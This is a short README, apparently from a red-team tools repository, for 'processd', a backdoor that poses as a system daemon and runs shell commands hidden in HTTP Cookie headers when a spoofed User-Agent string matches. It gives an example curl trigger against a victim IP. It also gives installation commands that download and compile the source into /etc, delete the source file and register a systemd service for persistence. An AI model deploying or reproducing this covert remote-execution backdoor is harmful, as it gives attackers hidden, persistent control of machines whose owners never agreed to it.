## Processd RCE

Creates a process called processd that runs a program that listens for commands hidden in the headers of an HTTP request:
- Cookie: The command to run
- Upgrade-Insecure_Requests: The local port to send command results to 

User Agent must match "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"

Example Attack:
`curl $VICTIM_IP -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" -H "Cookie: $CMD" -H "Upgrade-Insecure-Requests: $RETURN_PORT" > /dev/null 2>&1`

Installation:
```
sudo wget "https://raw.githubusercontent.com/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.c" -O /tmp/processd.c
sudo gcc /tmp/processd.c -o /etc/processd
sudo rm /tmp/processd.c
chmod 500 /etc/processd
sudo wget "https://raw.githubusercontent.com/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service" -O "/etc/systemd/system/processd.service"
```
